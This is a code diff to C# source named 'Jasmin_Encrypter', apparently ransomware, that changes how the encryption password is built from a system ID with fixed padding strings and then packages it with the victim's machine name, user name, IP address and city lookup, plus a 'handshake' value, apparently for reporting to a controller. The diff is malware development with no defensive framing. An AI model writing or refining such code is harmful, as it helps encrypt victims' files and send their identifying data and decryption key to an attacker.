@@ -37,7 +37,7 @@ namespace Jasmin_Encrypter
         public static string AlertMsgFile = AlertMsgPath + "alertmsg.zip";
         public static string passwordkey  = "";
         public static string systemid     = "";
-        public static string HDid        = "";
+        public static string HDid         = "";
 
         static void Main(string[] args)
         {
@@ -129,14 +129,15 @@ namespace Jasmin_Encrypter
                     {
                         var api = new IpInfoApi(client);
                         var rep = api.GetCurrentCityAsync();
-                       //string location = new System.Net.WebClient().DownloadString("");
-                        HDid = "54444" + systemid + "54444";
+                       //string location = new System.Net.WebClient().DownloadString("");       
                         Console.WriteLine($"City: {rep.Result}");
                         return rep.Result;
                     }
 
+                    HDid = "A125OKA" + systemid + "4758ahzii";
                     string Passwd = HDid;
-                    var pairs = new List<KeyValuePair<string, string>>
+                    passwordkey = Passwd;
+                   var pairs = new List<KeyValuePair<string, string>>
                     {
                     new KeyValuePair<string, string>("machine_name", machine),
                     new KeyValuePair<string, string>("computer_user", username),
@@ -147,7 +148,7 @@ namespace Jasmin_Encrypter
                     new KeyValuePair<string, string>("ip", ip),
                     new KeyValuePair<string, string>("location", location()),
                     // new KeyValuePair<string, string>("location", "Unkown"),
-                    new KeyValuePair<string, string>("password", Passwd),                
+                    new KeyValuePair<string, string>("password", passwordkey),                
                     new KeyValuePair<string, string>("handshake", "jasmin@123"),
                     };
 
